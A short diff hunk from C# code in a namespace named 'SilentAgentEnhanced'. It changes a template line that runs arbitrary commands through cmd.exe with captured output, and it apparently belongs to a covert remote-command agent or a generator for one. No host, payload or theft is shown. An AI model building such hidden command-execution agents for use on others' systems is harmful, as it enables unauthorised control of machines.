@@ -973,7 +973,7 @@ namespace SilentAgentEnhanced
             {{
                 ProcessStartInfo psi = new ProcessStartInfo();
                 psi.FileName = "cmd.exe";
-                psi.Arguments = $"/c {command}";
+                psi.Arguments = $"/c {{command}}";
                 psi.RedirectStandardOutput = true;
                 psi.RedirectStandardError = true;
                 psi.UseShellExecute = false;
